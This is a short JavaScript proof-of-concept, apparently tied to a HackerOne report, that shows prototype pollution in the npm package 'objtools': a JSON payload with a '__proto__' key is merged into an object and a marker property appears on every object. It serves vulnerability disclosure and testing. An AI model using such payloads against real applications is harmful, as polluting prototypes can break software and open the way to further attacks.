// //https://hackerone.com/reports/878394

// test("prototype pollution in objtools", () => {
  const objtools = require("objtools");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}'); //payload
  obj = {};

console.log({}.polluted);

  objtools.merge({}, payload);
console.log({}.polluted);
// });
